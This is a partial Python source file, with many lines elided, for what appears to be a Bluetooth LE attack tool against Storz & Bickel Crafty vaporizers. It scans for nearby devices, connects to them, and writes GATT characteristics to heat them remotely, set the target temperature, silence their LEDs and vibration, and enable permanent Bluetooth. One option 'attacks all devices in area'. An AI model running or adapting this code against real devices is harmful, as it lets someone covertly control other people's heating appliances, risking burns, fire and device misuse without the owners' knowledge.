    ...
    def device_discovered(self, device):
        if device.alias() == "STORZ&BICKEL" and running:
            ...
            if not device.mac_address in self.black_list and\
                ...
                device2 = CraftyDevice(mac_address=device.mac_address, manager=discovery_manager)
                device2.connect()
...
class CraftyDevice(gatt.Device):
    ...
    def connect_succeeded(self):
        ...
        self.ready_vib = not Silence_Devices #If we don't want to change it, it's already ready
        self.ready_led = not Silence_Devices #If we don't want to change it, it's already ready
        self.set_perm = Permanent_Bluetooth #If we don't want to change it, it's already ready
        lock.acquire()
        cdevices += 1
        lock.release()
            ...
            for characteristic in service.characteristics:
                ...
                if Temp != None:
                    if characteristic.uuid == "00000021-4c45-4b43-4942-265a524f5453":
                        characteristic.write_value((Temp*10).to_bytes(2,byteorder="little"))
                        if Verbose:
                            print("[I] Setting target temperature of device ({}) to {}".format(self.mac_address,Temp*10))
    ...
    def setBrightness(self,value,characteristic=None):
        ...
        if char == None or char.uuid != "00000051-4c45-4b43-4942-265a524f5453":
            char = self.getCharacteristic("00000051-4c45-4b43-4942-265a524f5453")

        char.write_value((val).to_bytes(2,byteorder="little")) #write value to characteristic
        return True

    def setVibration(self,characteristic=None,on=False):
        if self.c1c3 == None:
            return False
        mask = BitArray('0b0000000100000000') if not on else BitArray('0b1111111011111111')

        char = characteristic
        if char == None or char.uuid != "000001c3-4c45-4b43-4942-265a524f5453":
            char = self.getCharacteristic("000001c3-4c45-4b43-4942-265a524f5453")

        if on:
            self.c1c3 = (self.c1c3 & mask) #Setting the 8. bit to 1 to activate Vibrations
        else:
            self.c1c3 = (self.c1c3 | mask)#Setting the 8. bit to 0 to deactivate Vibrations
    ...
    def setPermanentBluetooth(self,characteristic=None,on=True):
        ...
        mask = BitArray('0b0000000000010000') if on else BitArray('0b1111111111101111')

        if on:
            self.c1c3 = (self.c1c3 & mask) #Setting the 8. bit to 1 to activate Permanent Bluetooth
        else:
            self.c1c3 = (self.c1c3 | mask) #Setting the 8. bit to 0 to deactivate Permanent Bluetooth
    ...
    def findMyCrafty(self,characteristic = None):
        ...
        characteristic.write_value((self.c1c3 | BitArray('0b0000100000000000')).bytes) #Setting the 5. bit to 1 to activate find my crafty
    ...
    def turnOn(self,characteristic = None):
        if self.on == False:
            ...
            if char == None or char.uuid != "00000081-4c45-4b43-4942-265a524f5453":
                char = self.getCharacteristic("00000081-4c45-4b43-4942-265a524f5453")
    ...
    def turnOff(self,characteristic = None):
        if self.on == True:
            ...
            if char == None or char.uuid != "00000091-4c45-4b43-4942-265a524f5453":
                char = self.getCharacteristic("00000091-4c45-4b43-4942-265a524f5453")
            char.write_value(bytes(2))
            self.on = False
    ...
    def characteristic_value_updated(self, characteristic, value):
        if characteristic.uuid == "00000022-4c45-4b43-4942-265a524f5453" and self.modell == None:
            ...
            if self.modell == "Crafty":
                ...
                print("[E] Device ({}) is based on an unsupported modell".format(self.mac_address))
        ...
        if characteristic.uuid == "00000093-4c45-4b43-4942-265a524f5453": #device status
            ...
            if time() - self.last_on_update > .5:
                ...
                if self.ready_led and self.ready_vib: #Only turn device on/off if everything is ready 
                    if Heat:
                        ...
                        self.turnOff()
                    print("[I] Turned device ({}) {}".format(self.mac_address,"on" if self.on else "off"))
            ...
            if not self.ready_led: #Do we want to deactivate the led?
                self.ready_led = self.setBrightness(0,characteristic=characteristic)
                if Verbose:
                    print("[I] Deactivated LEDs on device ({})".format(self.mac_address))
            ...
            if not self.ready_vib:  #Do we want to deactivate Vibrations?
                self.ready_vib = self.setVibration(characteristic) #If we failed to set it, retry it
                if Verbose:
                    print("[I] Deactivated vibrations and charging LEDs on device ({})".format(self.mac_address))

            elif Vibrate_Devices:  #Do we want to  activate "Find My Crafty" on the devices (led blinks, vibrating)?               
            ...
            if Permanent_Bluetooth: #Do we want to activate permanent Bluetooth?
                if self.set_perm == True:
                    self.set_perm = not self.setPermanentBluetooth(characteristic)
                    if Verbose:
                        print("[I] Enabling permanent bluetooth on device ({})".format(self.mac_address))
...
def verifyMac(mac):
    return mac if re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", mac.lower()) else None #Verify that the mac is formatted correctly, else return None
...
def thread():
    ...
    manager = gatt.DeviceManager(adapter_name=Interface) #Creating Device Manager
    discovery_manager = DiscoveryManager(adapter_name=Interface) #Creating Discovery Manager
...
def createParser():
    ...
    parser.add_argument('-i','--interface',default = "hci0",help="specify interface")
    parser.add_argument('-m','--mac',default = None,help="specify target mac",type=verifyMac)
    parser.add_argument('-a','--all', action='store_true',help='attack all devices in area, overwrites \'--mac\'')
    parser.add_argument('-o','--heat', action='store_true',help='start device(s)')
    parser.add_argument('-p','--perm', action='store_true',help='enable permanent bluetooth')
    parser.add_argument('-s','--silent', action='store_true',help='deactivate vibration and LEDs of devices')
    parser.add_argument('-f','--vibrate', action='store_true',help='let devices vibrate')
    parser.add_argument('-t','--target_temp', default=None,help='sets the target temperature',type=verifyTemp)
    parser.add_argument('-l','--list-devices', action='store_true',help='run discovery and print macs of supported devices in the area. Can be combined with \'--mac\' and \'--all\'')
...
def main():
    global running,stopped, cdevices, Target
    parser = createParser()
    args = parse(parser)
    if Target:
        try:
